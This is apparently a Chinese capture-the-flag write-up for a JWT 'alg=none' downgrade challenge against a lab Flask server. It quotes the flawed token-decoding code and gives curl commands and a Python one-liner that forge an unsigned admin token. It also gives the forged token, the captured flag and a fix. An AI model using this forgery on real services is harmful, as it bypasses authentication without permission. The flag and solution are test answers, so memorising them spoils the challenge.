# Q35 - 逻辑漏洞 · JWT 算法降级 (alg=none)

- 实测靶机：`http://47.120.76.57:34947/`
- FLAG：`TOGOGO-flag{f09bfb0c-7f7d-42f0-80cf-a9cc5f18db20}`

## 题目速览

Flask + PyJWT 2.8，三个接口：

- `POST /api/login`（form: `username/password`）→ 返回 HS256 token
- `GET  /api/me`（`Authorization: Bearer <token>`）→ 返回 payload
- `GET  /api/flag`（payload 里 `role=admin` 才能访问）→ 返回 flag
- 测试账号 `guest/guest123`，登录后 `role=user`

## 漏洞点

服务端 `decode_token` 信任 header 自声明的 `alg`：

```python
alg = jwt.get_unverified_header(token).get('alg', 'HS256')
if alg.lower() == 'none':
    return jwt.decode(token, options={'verify_signature': False}, algorithms=['none'])
return jwt.decode(token, JWT_SECRET, algorithms=[alg])
```

`JWT_SECRET = secrets.token_hex(32)`，HS256 爆破无解。唯一通道：把 `alg` 改成 `none`，让服务端直接跳过签名校验。

## 手工 4 步复刻

### 1. 登录拿对照 token（可选，确认接口在线）

```bash
curl -X POST http://47.120.76.57:34947/api/login \
  -d "username=guest&password=guest123"
# {"ok":true,"token":"eyJhbGciOiJIUzI1NiIs...role:user 的 HS256 token"}
```

### 2. 用 guest token 访问 /api/flag → 被拒（确认权限模型）

```bash
curl http://47.120.76.57:34947/api/flag \
  -H "Authorization: Bearer <上一步的 token>"
# {"ok":false,"msg":"admin only"}
```

### 3. 本地伪造 `alg=none` token（无需任何依赖）

JWT = `base64url(header) . base64url(payload) . signature`。`alg=none` 时签名段留空，但**末尾点必须保留**。

```bash
python3 -c "
import base64, json
b=lambda d: base64.urlsafe_b64encode(json.dumps(d,separators=(',',':')).encode()).rstrip(b'=').decode()
h=b({'alg':'none','typ':'JWT'})
p=b({'user':'admin','role':'admin'})
print(f'{h}.{p}.')
"
```

输出（可直接复制）：

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
```

### 4. 用伪造 token 访问 /api/flag → 拿 flag

```bash
TOKEN='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.'

curl http://47.120.76.57:34947/api/me   -H "Authorization: Bearer $TOKEN"
# {"ok":true,"payload":{"role":"admin","user":"admin"}}   ← 服务端接受 none

curl http://47.120.76.57:34947/api/flag -H "Authorization: Bearer $TOKEN"
# {"ok":true,"flag":"TOGOGO-flag{f09bfb0c-7f7d-42f0-80cf-a9cc5f18db20}"}
```

## 关键细节

| 现象 | 原因 |
| --- | --- |
| token 末尾点丢失 → 报错 | JWT 强制 3 段式，没签名也要留分隔点 |
| `alg:NONE` 大写仍可绕（本题） | 代码用 `alg.lower() == 'none'` |
| 第三段签名乱填仍 ok | `verify_signature=False` 完全忽略签名段 |
| HS256 + 改 role → `Signature verification failed` | 密钥 32 字节强随机，无爆破空间 |

## 一键脚本

见 `main.py`（纯标准库，无需 PyJWT）：

```bash
python3 main.py
# [FLAG] TOGOGO-flag{f09bfb0c-7f7d-42f0-80cf-a9cc5f18db20}
```

## 修复建议

```python
# 永远固定算法白名单 + 密钥，不要从 header 读 alg
payload = jwt.decode(token, SECRET, algorithms=['HS256'])
```

禁止任何形式的「读 header.alg 再选分支」或 `options={'verify_signature': False}` 走业务流程。
